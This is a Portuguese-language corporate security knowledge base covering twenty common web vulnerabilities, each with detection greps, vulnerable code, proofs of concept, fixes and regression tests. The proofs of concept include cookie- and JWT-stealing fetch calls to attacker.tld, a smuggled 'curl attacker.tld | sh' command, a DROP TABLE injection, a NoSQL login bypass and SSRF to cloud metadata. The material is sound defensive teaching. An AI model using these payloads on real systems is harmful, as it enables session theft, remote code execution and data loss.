# Knowledge Base — Vulnerabilidades Comuns

**Versão:** 1.0.0
**Mantida por:** Equipe de Segurança Corporativa — Clean Environment
**Última atualização:** 2026-05-17
**Consumida por:** `/speckit.security-audit` e `/speckit.threat-model`

Esta base de conhecimento cataloga padrões de vulnerabilidade comuns ao stack típico da Clean Environment. Cada entrada é referenciada por **slug** estável (ex.: `xss-html-injection`) que pode ser citado em findings, plans e specs.

Estrutura padrão de cada entrada:
- Slug, severidade default, CWE, OWASP relacionado
- Identificação (padrões grep)
- Exemplo vulnerável
- PoC de exploração
- Correção
- Teste de regressão

---

## Índice

1. [xss-html-injection](#xss-html-injection) — XSS por injeção em HTML
2. [xss-dom-based](#xss-dom-based) — XSS via DOM
3. [sql-injection](#sql-injection) — SQL Injection
4. [nosql-injection](#nosql-injection) — NoSQL Injection
5. [localstorage-token](#localstorage-token) — Token de sessão em localStorage
6. [idor](#idor) — Insecure Direct Object Reference
7. [csrf-missing](#csrf-missing) — CSRF sem proteção
8. [hardcoded-secret](#hardcoded-secret) — Secret hardcoded em código
9. [open-redirect](#open-redirect) — Open redirect
10. [path-traversal](#path-traversal) — Path traversal em upload/download
11. [ssrf](#ssrf) — Server-Side Request Forgery
12. [insecure-deserialization](#insecure-deserialization) — Deserialização insegura
13. [cors-wildcard](#cors-wildcard) — CORS aberto com credentials
14. [missing-rate-limit](#missing-rate-limit) — Falta de rate limit
15. [weak-password-hash](#weak-password-hash) — Hash fraco em senhas
16. [pii-in-logs](#pii-in-logs) — PII em logs
17. [mass-assignment](#mass-assignment) — Mass assignment
18. [command-injection](#command-injection) — Command injection
19. [jwt-alg-none](#jwt-alg-none) — JWT alg=none / confusion
20. [source-map-leak](#source-map-leak) — Source map em produção

---

<a id="xss-html-injection"></a>
## 1. xss-html-injection — XSS por injeção em HTML

**Severidade:** ALTO–CRÍTICO
**CWE:** CWE-79
**OWASP:** A03 (Injection)
**Cláusula Constituição:** II.4

### Identificação

```bash
grep -rnE "dangerouslySetInnerHTML|innerHTML\s*=|v-html|\{\{\{" src/
```

### Exemplo vulnerável

```tsx
<div dangerouslySetInnerHTML={{ __html: comment.body }} />
```

### PoC

Input do atacante salvo no banco:
```html
<img src=x onerror="fetch('https://attacker.tld/log?c='+document.cookie)">
```
Ao renderizar, o JS executa no contexto do usuário vítima.

### Correção

```tsx
// Opção 1 — texto puro (React escapa)
<div>{comment.body}</div>

// Opção 2 — Markdown
import ReactMarkdown from 'react-markdown';
<ReactMarkdown>{comment.body}</ReactMarkdown>

// Opção 3 — HTML rico necessário
import DOMPurify from 'isomorphic-dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.body) }} />
```

### Teste de regressão

```js
it('renderiza payload XSS como texto', async () => {
  const r = await request(app).post('/comments').send({ body: '<img src=x onerror=alert(1)>' });
  const html = await renderPage(r.body.id);
  expect(html).not.toContain('onerror=');
  expect(html).toContain('&lt;img src=x');
});
```

---

<a id="xss-dom-based"></a>
## 2. xss-dom-based — XSS via DOM

**Severidade:** ALTO
**CWE:** CWE-79
**OWASP:** A03
**Cláusula Constituição:** II.4

### Identificação

```bash
grep -rnE "document\.write|window\.location\s*=|location\.href\s*=\s*.*?\$\{" src/
```

### Exemplo vulnerável

```js
const path = location.hash.slice(1);
document.getElementById('content').innerHTML = path;
```

### PoC

URL: `https://app.tld/#<img src=x onerror=alert(1)>`

### Correção

Usar `textContent`, não `innerHTML`. Para `location.hash`, validar contra whitelist de rotas.

### Teste de regressão

Adicionar Playwright/Cypress que carrega URL com payload e verifica que `document.body.innerHTML` não contém o payload renderizado.

---

<a id="sql-injection"></a>
## 3. sql-injection — SQL Injection

**Severidade:** CRÍTICO
**CWE:** CWE-89
**OWASP:** A03
**Cláusula Constituição:** II.2

### Identificação

```bash
grep -rnE "(query|execute|raw)\s*\(\s*[\"'\`].*\\\$\{" src/
grep -rnE "SELECT\s.*?\$\{|INSERT\s.*?\$\{|UPDATE\s.*?\$\{|DELETE\s.*?\$\{" src/
```

### Exemplo vulnerável

```ts
const users = await db.query(`SELECT * FROM users WHERE email = '${email}'`);
```

### PoC

`email = "' OR '1'='1"` → retorna todos os usuários.
`email = "x'; DROP TABLE users; --"` (com driver multi-statement).

### Correção

```ts
// Prisma
const user = await prisma.user.findUnique({ where: { email } });

// node-postgres
const r = await db.query('SELECT * FROM users WHERE email = $1', [email]);

// Knex
const r = await knex('users').where('email', email).first();
```

### Teste de regressão

```js
it('absorve SQL injection sem efeito', async () => {
  const r = await request(app).get(`/users?email=${encodeURIComponent("' OR '1'='1")}`);
  expect(r.status).toBe(404); // não encontrou usuário com esse email literal
});
```

---

<a id="nosql-injection"></a>
## 4. nosql-injection — NoSQL Injection (MongoDB/equivalente)

**Severidade:** CRÍTICO
**CWE:** CWE-943
**OWASP:** A03
**Cláusula Constituição:** II.1, II.2

### Identificação

```bash
grep -rnE "find\(\s*req\.(body|query|params)" src/
```

### Exemplo vulnerável

```js
User.findOne({ email: req.body.email, password: req.body.password });
```

### PoC

```json
{ "email": "admin@x.com", "password": { "$ne": null } }
```
Bypass de autenticação.

### Correção

Validar com schema (Zod): `z.string()` força string e rejeita objetos.

```ts
const schema = z.object({ email: z.string().email(), password: z.string().min(8) });
const { email, password } = schema.parse(req.body);
```

### Teste de regressão

Enviar `{password: {$ne: null}}` e esperar 400.

---

<a id="localstorage-token"></a>
## 5. localstorage-token — Token de sessão em localStorage

**Severidade:** ALTO
**CWE:** CWE-922
**OWASP:** A02 / A07
**Cláusula Constituição:** I.1

### Identificação

```bash
grep -rnE "localStorage\.(setItem|getItem).*?(token|jwt|auth|session)" src/
grep -rnE "sessionStorage\.(setItem|getItem).*?(token|jwt|auth|session)" src/
```

### Exemplo vulnerável

```js
localStorage.setItem('jwt', response.data.token);
```

### PoC

Qualquer XSS exfiltra: `fetch('https://attacker.tld?t=' + localStorage.getItem('jwt'))`.

### Correção

Backend: retornar token via Set-Cookie HttpOnly.

```ts
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 15 * 60 * 1000,
  path: '/',
});
```

Frontend: `fetch(url, { credentials: 'include' })`.

### Teste de regressão

```js
it('não armazena token em localStorage', () => {
  // Em Playwright pós-login:
  expect(await page.evaluate(() => Object.keys(localStorage))).not.toContain('jwt');
});
```

---

<a id="idor"></a>
## 6. idor — Insecure Direct Object Reference

**Severidade:** CRÍTICO–ALTO
**CWE:** CWE-639
**OWASP:** A01
**Cláusula Constituição:** I.5, I.6

### Identificação

Análise manual de endpoints: para cada `GET/PUT/DELETE /resource/:id`, verificar se há checagem `req.user.id === resource.userId`.

### Exemplo vulnerável

```ts
app.get('/invoices/:id', authenticate, async (req, res) => {
  const inv = await db.invoice.findUnique({ where: { id: req.params.id } });
  res.json(inv);
});
```

### PoC

Usuário A loga e acessa `/invoices/123`. Troca id para `/invoices/124` (de outro usuário) — recebe os dados.

### Correção

```ts
app.get('/invoices/:id', authenticate, async (req, res) => {
  const inv = await db.invoice.findFirst({
    where: { id: req.params.id, userId: req.user.id }
  });
  if (!inv) return res.status(404).json({ error: 'Not found' });
  res.json(inv);
});
```

### Teste de regressão

```js
it('rejeita IDOR', async () => {
  const userA = await login('a@x.com');
  const invB = await createInvoiceAs('b@x.com');
  const r = await request(app)
    .get(`/invoices/${invB.id}`)
    .set('Cookie', userA.cookie);
  expect(r.status).toBe(404);
});
```

---

<a id="csrf-missing"></a>
## 7. csrf-missing — CSRF sem proteção

**Severidade:** ALTO
**CWE:** CWE-352
**OWASP:** A01
**Cláusula Constituição:** I.1 (SameSite=Strict mitiga), III.4

### Identificação

Endpoints state-changing (POST/PUT/DELETE) com sessão via cookie e sem `SameSite=Strict` nem token CSRF.

### Correção

Defesa primária: `SameSite=Strict` no cookie (Cláusula I.1).
Defesa secundária: token CSRF double-submit ou Synchronizer Token Pattern.

```ts
import csrf from 'csurf';
app.use(csrf({ cookie: { httpOnly: true, sameSite: 'strict' } }));
```

### Teste de regressão

Forjar request cross-origin sem header CSRF e esperar 403.

---

<a id="hardcoded-secret"></a>
## 8. hardcoded-secret — Secret hardcoded

**Severidade:** CRÍTICO
**CWE:** CWE-798
**OWASP:** A02 / A05
**Cláusula Constituição:** V.5

### Identificação

```bash
grep -rnE "(api[_-]?key|secret|password|token)\s*[=:]\s*[\"'][^\"']{8,}" src/
grep -rnE "sk_live_|sk-ant-|AIza|ghp_|glpat-|xoxb-|AKIA[0-9A-Z]" .
```

### Correção

Mover para env var, atualizar `.env.example`, rotacionar o secret comprometido (mesmo após remover do código, ele ficou no git history).

### Teste de regressão

CI roda `git secrets --scan` e falha se algum padrão for detectado.

---

<a id="open-redirect"></a>
## 9. open-redirect — Open redirect

**Severidade:** MÉDIO–ALTO
**CWE:** CWE-601
**OWASP:** A01

### Identificação

```bash
grep -rnE "res\.redirect\(.*?req\.(query|body|params)" src/
```

### Exemplo vulnerável

```ts
app.get('/login/callback', (req, res) => res.redirect(req.query.returnTo));
```

### PoC

`/login/callback?returnTo=https://phishing.tld`

### Correção

Whitelist:
```ts
const allowed = new Set(['/dashboard', '/profile']);
const target = allowed.has(req.query.returnTo) ? req.query.returnTo : '/dashboard';
res.redirect(target);
```

---

<a id="path-traversal"></a>
## 10. path-traversal — Path Traversal

**Severidade:** CRÍTICO
**CWE:** CWE-22
**OWASP:** A01 / A05
**Cláusula Constituição:** II.6

### Identificação

```bash
grep -rnE "path\.join\(.*?req\.(query|body|params)" src/
grep -rnE "fs\.(read|write)\w+\(.*?req\.(query|body|params)" src/
```

### Exemplo vulnerável

```ts
fs.readFile(path.join('/uploads', req.params.filename));
```

### PoC

`/files/..%2F..%2Fetc%2Fpasswd`

### Correção

```ts
const safe = path.basename(req.params.filename);
fs.readFile(path.join('/uploads', userScopedDir, safe));
```

E sempre gerar nomes de arquivos como UUID (Cláusula II.6).

---

<a id="ssrf"></a>
## 11. ssrf — Server-Side Request Forgery

**Severidade:** ALTO–CRÍTICO
**CWE:** CWE-918
**OWASP:** A10

### Identificação

```bash
grep -rnE "(fetch|axios|http\.get|requests\.get)\(.*?req\.(query|body|params)" src/
```

### PoC

`/proxy?url=http://169.254.169.254/latest/meta-data/` (AWS metadata; idem GCP/Azure).
`/proxy?url=http://localhost:8080/admin`

### Correção

- Whitelist de hosts permitidos.
- Resolver DNS antes; verificar IP não está em ranges privados (RFC 1918, link-local, loopback).
- Desabilitar follow redirects, ou validar destino do redirect também.
- Timeout curto.

```ts
import { isIPv4, isIPv6 } from 'net';
import dns from 'dns/promises';
const hostAllowed = ['api.partner.tld'];
async function safeFetch(url: string) {
  const u = new URL(url);
  if (!hostAllowed.includes(u.hostname)) throw new Error('Host not allowed');
  const { address } = await dns.lookup(u.hostname);
  if (isPrivateIP(address)) throw new Error('Private IP');
  return fetch(url, { redirect: 'error', signal: AbortSignal.timeout(5000) });
}
```

---

<a id="insecure-deserialization"></a>
## 12. insecure-deserialization — Deserialização insegura

**Severidade:** CRÍTICO
**CWE:** CWE-502
**OWASP:** A08

### Identificação

Uso de `eval`, `Function()` com input, `node-serialize`, `pickle.loads` (Python) sobre input não confiável.

### Correção

Nunca desserializar formatos com execução de código a partir de input externo. Para dados externos, usar JSON com validação de schema.

---

<a id="cors-wildcard"></a>
## 13. cors-wildcard — CORS com `*` + credentials

**Severidade:** ALTO
**CWE:** CWE-942
**OWASP:** A05
**Cláusula Constituição:** III.4

### Identificação

```bash
grep -rnE "origin\s*:\s*['\"]\*['\"]|Access-Control-Allow-Origin:\s*\*" src/
```

### Correção

Whitelist a partir de env var:

```ts
const allowed = (process.env.ALLOWED_ORIGINS || '').split(',');
app.use(cors({
  origin: (origin, cb) => allowed.includes(origin || '') ? cb(null, true) : cb(new Error('CORS')),
  credentials: true,
}));
```

---

<a id="missing-rate-limit"></a>
## 14. missing-rate-limit — Falta de rate limit

**Severidade:** MÉDIO–ALTO
**CWE:** CWE-799
**OWASP:** A04 / A07
**Cláusula Constituição:** I.4

### Identificação

Análise manual: endpoints de auth, públicos e user-scoped sem middleware de rate limit.

### Correção

```ts
import rateLimit from 'express-rate-limit';
app.use('/auth/login', rateLimit({ windowMs: 15*60*1000, max: 5 }));
app.use('/api', rateLimit({ windowMs: 60_000, max: 100 }));
```

---

<a id="weak-password-hash"></a>
## 15. weak-password-hash — Hash fraco em senhas

**Severidade:** CRÍTICO
**CWE:** CWE-327, CWE-916
**OWASP:** A02
**Cláusula Constituição:** I.2

### Identificação

```bash
grep -rnE "(md5|sha1|sha256)\(.*password" src/
grep -rnE "createHash\(['\"](md5|sha1|sha256)" src/
```

### Correção

```ts
import bcrypt from 'bcrypt';
const hash = await bcrypt.hash(password, 12);  // cost >= 12
// ou
import argon2 from 'argon2';
const hash = await argon2.hash(password, { type: argon2.argon2id });
```

---

<a id="pii-in-logs"></a>
## 16. pii-in-logs — PII em logs

**Severidade:** MÉDIO–ALTO
**CWE:** CWE-532
**OWASP:** A09
**Cláusula Constituição:** III.2

### Identificação

Logger sem allowlist; uso de `console.log(req.body)` ou `logger.info({ user })` com objeto completo do usuário.

### Correção

Logger com sanitizer:

```ts
const safeFields = ['userId', 'requestId', 'method', 'path', 'status', 'duration'];
function sanitize(obj: any) { /* ... mantém só safeFields ... */ }
logger.info(sanitize(ctx));
```

### Teste de regressão

Capturar saída do logger durante teste de auth e garantir que `password`, `token`, `cpf` não aparecem.

---

<a id="mass-assignment"></a>
## 17. mass-assignment — Mass assignment

**Severidade:** ALTO
**CWE:** CWE-915
**OWASP:** A01

### Identificação

```bash
grep -rnE "\.\.\.req\.(body|query)|Object\.assign\(.*?req\.(body|query)" src/
```

### Exemplo vulnerável

```ts
const user = await User.create({ ...req.body });  // attacker manda role: 'admin'
```

### Correção

Pick explícito (whitelist):

```ts
const { name, email } = z.object({ name: z.string(), email: z.string().email() }).parse(req.body);
const user = await User.create({ name, email, role: 'user' });
```

---

<a id="command-injection"></a>
## 18. command-injection — Command Injection

**Severidade:** CRÍTICO
**CWE:** CWE-78
**OWASP:** A03

### Identificação

```bash
grep -rnE "(exec|execSync|spawn|spawnSync|subprocess\.run)\(.*?(\\\$\{|\+)" src/
```

### Exemplo vulnerável

```ts
exec(`convert ${userPath} out.png`);
```

### PoC

`userPath = "input.jpg; curl attacker.tld | sh"` → executa shell.

### Correção

```ts
import { execFile } from 'child_process';
execFile('convert', [userPath, 'out.png']);  // argumentos como array, sem shell
```

---

<a id="jwt-alg-none"></a>
## 19. jwt-alg-none — JWT alg=none / confusion

**Severidade:** CRÍTICO
**CWE:** CWE-347
**OWASP:** A02 / A07

### Identificação

`jwt.verify(token)` sem segundo argumento (sem segredo), ou aceita `algorithms: [...]` permissivo.

### Correção

```ts
jwt.verify(token, secret, { algorithms: ['HS256'] });  // ou RS256
```

Nunca aceitar `alg=none`.

---

<a id="source-map-leak"></a>
## 20. source-map-leak — Source map em produção

**Severidade:** MÉDIO
**CWE:** CWE-540
**OWASP:** A05

### Identificação

Build produz `*.js.map` servidos publicamente.

### Correção

`vite.config.ts`: `build: { sourcemap: false }`.
Webpack: `devtool: 'hidden-source-map'` e não publicar `.map`.
CI: bloquear deploy se houver `.map` no diretório público.

### Teste de regressão

```bash
curl -I https://app.tld/main.js.map  # esperar 404
```

---

## Como propor nova entrada

1. Abra issue em `spec-kit-private` com label `kb:vulnerability`.
2. Inclua: slug, CWE, exemplo vulnerável real (sanitizado), correção testada, teste de regressão.
3. PR para `knowledge/vulnerabilities.md`.
4. Aprovação: 2 membros da Equipe de Segurança Corporativa.
5. Bump de versão da extension (semver patch para nova entrada, minor se reorganização).
